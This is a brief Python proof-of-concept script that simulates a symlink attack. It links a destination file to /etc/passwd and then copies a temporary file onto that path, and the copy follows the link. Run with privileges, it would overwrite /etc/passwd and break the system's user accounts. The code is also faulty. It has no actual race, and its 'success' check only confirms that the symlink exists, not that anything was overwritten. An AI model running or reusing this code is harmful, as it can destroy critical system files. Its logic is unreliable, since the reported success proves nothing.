import os
import shutil
import time

# Simulate the environment setup
os.makedirs('source', exist_ok=True)
os.makedirs('destination', exist_ok=True)

# Path to the source and destination
source_path = 'source/tempfile.txt'
destination_path = 'destination/tempfile.txt'

# Create a temporary file in the source directory
with open(source_path, 'w') as f:
    f.write('This is a temporary file.')

# Function to simulate the race condition
def exploit():
    # Lower-privileged user creates a symlink to a critical file
    os.symlink('/etc/passwd', destination_path)
    
    # GruntJS user copies the file
    shutil.copy(source_path, destination_path)

    # Check if the exploit was successful
    if os.path.islink(destination_path) and os.readlink(destination_path) == '/etc/passwd':
        print('The ACI exploit success!!!')
    else:
        print('The ACI exploit failed!!!')

# Run the exploit
exploit()
